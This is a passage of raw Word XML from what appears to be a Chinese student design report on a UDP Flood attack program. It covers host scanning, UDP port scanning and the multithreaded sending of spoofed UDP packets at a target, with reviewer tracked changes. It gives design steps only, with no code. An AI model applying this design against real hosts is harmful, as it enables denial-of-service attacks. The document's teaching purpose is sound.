          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:rPrChange w:id="1045" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>UDP Flood</w:t>
      </w:r>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:rPrChange w:id="1046" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>攻击程序的</w:t>
      </w:r>
      <w:r w:rsidR="002F0711" w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>目标</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1042"/>
      <w:bookmarkEnd w:id="1043"/>
      <w:bookmarkEnd w:id="1044"/>
    </w:p>
    <w:p w14:paraId="6A0460D5" w14:textId="77777777" w:rsidR="004A2032" w:rsidRDefault="00A4447A" w:rsidP="004A2032">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13DF7611" w14:textId="119E6CB4" w:rsidR="00A4447A" w:rsidRPr="00A4447A" w:rsidRDefault="004A2032" w:rsidP="004A2032">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>首先</w:t>
      </w:r>
      <w:r w:rsidR="00A4447A" w:rsidRPr="00A4447A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>构造相应的UDP报文，向指定主机的指定端口发送，捕获并解析响应报文，根据报文内容判定该主机指定的UDP端口是否开放的；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B5BEBE" w14:textId="25E263A8" w:rsidR="00A4447A" w:rsidRPr="00E90326" w:rsidRDefault="004A2032" w:rsidP="00A4447A">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>然后</w:t>
      </w:r>
      <w:r w:rsidR="00A4447A" w:rsidRPr="00A4447A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>通过ARP协议获取指定主机的MAC地址，作为UDP报文的目的MAC；随机生成UDP报文的源MAC、源IP和源端口，构造UDP报文的以太网首部、IP首部和UDP报文；利用多线程技术，向指定主机发送大量伪造的UDP报文，对目标主机进行攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087C6896" w14:textId="6B3045A4" w:rsidR="009A4692" w:rsidRPr="00596B1B" w:rsidRDefault="009A4692" w:rsidP="009A4692">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1047" w:name="_Toc482141246"/>
      <w:bookmarkStart w:id="1048" w:name="_Toc482141919"/>
      <w:bookmarkStart w:id="1049" w:name="_Toc482522629"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:rPrChange w:id="1050" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>UDP Flood</w:t>
      </w:r>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:rPrChange w:id="1051" w:author="李勇" w:date="2017-05-13T21:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>攻击程序的基本功能</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1047"/>
      <w:bookmarkEnd w:id="1048"/>
      <w:bookmarkEnd w:id="1049"/>
    </w:p>
    <w:p w14:paraId="7BC02239" w14:textId="43731048" w:rsidR="009A4692"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240DD763" w14:textId="14E5BFEE" w:rsidR="00643046" w:rsidRPr="00643046" w:rsidRDefault="00643046" w:rsidP="00643046">
      <w:pPr>
        <w:pStyle w:val="af1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00643046">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>查找本机网卡设备，打开相应的网卡设备</w:t>
      </w:r>
      <w:r w:rsidR="004A2032">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，捕获该网卡上的数据包</w:t>
      </w:r>
      <w:r w:rsidRPr="00643046">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631E8A93" w14:textId="131CC138"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主机扫描</w:t>
      </w:r>
      <w:r w:rsidR="00643046">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716C3AA4" w14:textId="0444068D"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UDP端口扫描</w:t>
      </w:r>
      <w:r w:rsidR="00643046">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0250B242" w14:textId="729CE1A6" w:rsidR="00643046" w:rsidRPr="00E90326" w:rsidRDefault="004A2032" w:rsidP="00643046">
      <w:pPr>
        <w:pStyle w:val="af1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>构造UDP报文，进行UDP Flood攻击</w:t>
      </w:r>
      <w:r w:rsidR="00643046">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629D5695" w14:textId="5B9ADC5C" w:rsidR="00B3556A" w:rsidRPr="00596B1B" w:rsidRDefault="00D174CA" w:rsidP="00B3556A">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
          <w:rPrChange w:id="1052" w:author="李勇" w:date="2017-05-13T21:43:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
              <w:b/>
              <w:szCs w:val="30"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1053" w:name="_Toc482141247"/>
      <w:bookmarkStart w:id="1054" w:name="_Toc482141920"/>
      <w:bookmarkStart w:id="1055" w:name="_Toc482522630"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:rPrChange w:id="1056" w:author="李勇" w:date="2017-05-13T21:43:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>UDP Flood攻击程序的系统结构</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1053"/>
      <w:bookmarkEnd w:id="1054"/>
      <w:bookmarkEnd w:id="1055"/>
    </w:p>
    <w:p w14:paraId="7D6F57B5" w14:textId="5398AC99" w:rsidR="00B3556A" w:rsidRDefault="009A0F67" w:rsidP="00E70858">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="232247D8" wp14:editId="752AF046">
            <wp:extent cx="1714649" cy="37950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649" cy="3795089"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="001291AD" w14:textId="6AB2D05D" w:rsidR="00150B71" w:rsidRPr="009A0F67" w:rsidRDefault="00B3556A" w:rsidP="009A0F67">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>图3</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>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hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:instrText>SEQ 图3- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009A0F67">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>系统结构图</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C707C2" w14:textId="77777777" w:rsidR="003B77D2" w:rsidRPr="003B77D2" w:rsidRDefault="005A038C" w:rsidP="003B77D2">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1057" w:name="_Toc482141248"/>
      <w:bookmarkStart w:id="1058" w:name="_Toc482141921"/>
      <w:bookmarkStart w:id="1059" w:name="_Toc482522631"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>本章小结</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1057"/>
      <w:bookmarkEnd w:id="1058"/>
      <w:bookmarkEnd w:id="1059"/>
    </w:p>
    <w:p w14:paraId="249A07FF" w14:textId="513F5A2B" w:rsidR="009A0F67" w:rsidRPr="009A0F67" w:rsidRDefault="003B77D2" w:rsidP="009A0F67">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="312" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>本章</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>主要介绍概要设计。</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67"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r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>为后面的详细设计打下坚实的基础。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E16D94" w14:textId="4D826B62" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00C12C09" w:rsidP="009A0F67">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:pageBreakBefore/>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:ind w:left="431" w:hanging="431"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1060" w:name="_Hlt273261556"/>
      <w:bookmarkStart w:id="1061" w:name="_Hlt273463973"/>
      <w:bookmarkStart w:id="1062" w:name="_Toc482141249"/>
      <w:bookmarkStart w:id="1063" w:name="_Toc482141922"/>
      <w:bookmarkStart w:id="1064" w:name="_Toc482522632"/>
      <w:bookmarkStart w:id="1065" w:name="_Hlt273261419"/>
      <w:bookmarkEnd w:id="1060"/>
      <w:bookmarkEnd w:id="1061"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>详细设计</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1062"/>
      <w:bookmarkEnd w:id="1063"/>
      <w:bookmarkEnd w:id="1064"/>
    </w:p>
    <w:p w14:paraId="78953EA4" w14:textId="0D0E1DBE" w:rsidR="00D95F25" w:rsidRPr="00925835" w:rsidRDefault="007129C2" w:rsidP="00925835">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1066" w:name="_Toc482522633"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主机扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1066"/>
    </w:p>
    <w:p w14:paraId="0C56751B" w14:textId="47355077" w:rsidR="00D95F25" w:rsidRPr="00D95F25" w:rsidRDefault="00D95F25" w:rsidP="00D95F25">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1067" w:name="_Toc482522634"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>流程图</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1067"/>
    </w:p>
    <w:p w14:paraId="228DA216" w14:textId="1C9B1F08" w:rsidR="00C7659E" w:rsidRDefault="00C7659E" w:rsidP="00D95F25">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>4.1</w:t>
      </w:r>
      <w:r w:rsidR="00491EE6">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，</w:t>
      </w:r>
      <w:r w:rsidR="00D95F25">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>主机扫描</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>先输入扫描的起始和终止</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址，将输入的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址进行分组，每组</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址用一个线程来进行主机扫描，将扫描结果存储在一个全局变量中。等待所有扫描线程结束后，扫描结束。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B54DFDA" w14:textId="77777777" w:rsidR="00C7659E" w:rsidRDefault="00C7659E" w:rsidP="00030EC6">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EAE3B7C" wp14:editId="4D2CB8CC">
            <wp:extent cx="4191363" cy="601270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363" cy="6012701"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2890FB1A" w14:textId="2FE1C1B3" w:rsidR="00802D67" w:rsidRPr="00030EC6" w:rsidRDefault="00C7659E" w:rsidP="00030EC6">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">图4. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>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hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图4. \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00E30385">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00C7659E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FB146B">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>主机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>扫描流程图</w:t>
      </w:r>
      <w:ins w:id="1068" w:author="renxt" w:date="2017-05-13T20:56:00Z">
        <w:r w:rsidR="00140975">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>（第2个框</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1069" w:author="renxt" w:date="2017-05-13T20:57:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>、</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1070" w:author="renxt" w:date="2017-05-13T20:56:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>扫描</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1071" w:author="renxt" w:date="2017-05-13T20:57:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>起始IP和终止IP框对吗？</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1072" w:author="renxt" w:date="2017-05-13T20:56:00Z">
        <w:r w:rsidR="00140975">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>）</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="177AD11D" w14:textId="7DE49B67" w:rsidR="00300E84" w:rsidRDefault="00300E84" w:rsidP="00300E84">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1073" w:name="_Toc482522635"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>主要数据</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1073"/>
    </w:p>
    <w:p w14:paraId="462AC18B" w14:textId="42790D31" w:rsidR="00D95F25" w:rsidRPr="00F32CD2" w:rsidRDefault="00D95F25" w:rsidP="00F32CD2">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>主要数据如表</w:t>
      </w:r>
      <w:r w:rsidR="00506368">
        <w:rPr>
